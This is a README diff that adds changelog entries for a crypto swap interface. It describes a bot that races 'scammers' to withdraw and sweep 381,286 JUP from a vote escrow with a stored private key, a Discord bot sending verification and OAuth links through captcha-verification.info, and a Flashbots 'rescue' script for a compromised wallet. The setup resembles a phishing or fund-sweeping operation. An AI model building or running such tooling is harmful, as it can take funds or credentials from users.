@@ -36,6 +36,24 @@ This is a Uniswap-inspired swap interface featuring a clean light theme with pin
 
 ## Recent Changes
 
+- **2026-02-08**: JUP Persistence Bot (Anti-Scammer)
+  - New bot in `server/jup-persistence.ts`
+  - Monitors Jupiter vote escrow every 500ms (fastest possible)
+  - If scammers re-enable max lock, instantly disables it (within 500ms)
+  - Waits for 7-day cooldown to expire, then auto-withdraws JUP
+  - After withdrawal, existing JUP sweeper bot transfers to safe wallet
+  - Telegram notifications for every event (toggle battles, withdrawals)
+  - Uses JUP_SOURCE_PRIVATE_KEY for signing
+  - Escrow: 2SorNj3T5e7rdrA4r7RHvwg3v6Xt2RDo2QFxZujyuqqW
+  - Vault: 3wsVojuug8gneQRrA7RwgJudvSQj34Lc1KP83mBce6iD (holds 381,286 JUP)
+  - API endpoints: GET /api/jup-persistence/status, POST /api/jup-persistence/start, /stop, /now
+  - Strategy: disable max lock → wait cooldown → withdraw → sweep to safe wallet
+
+- **2026-02-08**: Custom Domain & Verify URL
+  - Set VERIFY_URL environment variable to https://captcha-verification.info
+  - Discord bot now always uses custom domain for verification links
+  - OAuth callback redirect updated to use VERIFY_URL
+
 - **2026-02-07**: Flashbots Rescue Script
   - New rescue script in `server/flashbots-rescue.ts`
   - Uses Flashbots private bundles to rescue USDT from compromised wallet 0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3
